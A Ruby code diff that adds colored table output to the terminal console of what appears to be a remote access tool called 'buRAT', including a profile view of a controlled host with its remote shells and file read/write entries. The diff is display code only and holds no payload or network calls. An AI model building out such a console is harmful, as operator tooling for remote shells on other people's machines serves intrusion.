@@ -1,3 +1,4 @@
+require 'pastel'
 require 'tty-cursor'
 require 'tty-font'
 require 'tty-progressbar'
@@ -11,10 +12,11 @@ module Internals
         data.push(value.fetch_values(:id, :host, :os, :ip, :status))
       end
 
-      cursor = TTY::Cursor
-      print cursor.move_to(0, 0)
-      print cursor.clear_screen
-      header = ['ID', 'HOST', 'OS', 'IP', 'STATUS']
+      pastel = Pastel.new
+      clear_screen()
+      header = ['ID', 'HOST', 'OS', 'IP', 'STATUS'].map! do |header|
+        pastel.bold(header)
+      end
       rows = data
       table = TTY::Table.new header, rows
       puts table.render :unicode, resize: true
@@ -33,6 +35,56 @@ module Internals
         frequency: 60,
         interval: 1
       )
+    end
+
+    def render_profile(bushi, remoteshell, filerw)
+      clear_screen()
+      pastel = Pastel.new
+
+      string = 're: buRAT'
+      (TTY::Screen.width - string.length).times {
+        string << " "
+      }
+      puts pastel.inverse.bold(string)
+      table = TTY::Table.new do |t|
+        t << ['id', bushi[:id]]
+        t << ['host', bushi[:host]]
+        t << ['os', bushi[:os]]
+        t << ['ip', bushi[:ip]]
+        t << ['status', bushi[:status]]
+      end
+      puts table.render :basic, alignments: [:right, :left], resize: true
+
+
+      string = 'REMOTESHELLS'
+      (TTY::Screen.width - string.length).times {
+        string << " "
+      }
+      puts pastel.inverse.bold(string)
+      table = TTY::Table.new
+      remoteshell.each do |r|
+        table << [r[:id], r[:shell]]
+      end
+      puts table.render :basic
+
+      pastel = Pastel.new
+      string = 'FILERW'
+      (TTY::Screen.width - string.length).times {
+        string << " "
+      }
+      puts pastel.inverse.bold(string)
+      table = TTY::Table.new
+      filerw.each do |f|
+        table << [f[:id], f[:path]]
+      end
+      puts table.render :basic, resize: true
+    end
+
+    private
+    def clear_screen()
+      cursor = TTY::Cursor
+      print cursor.move_to(0, 0)
+      print cursor.clear_screen
     end
   end
 end
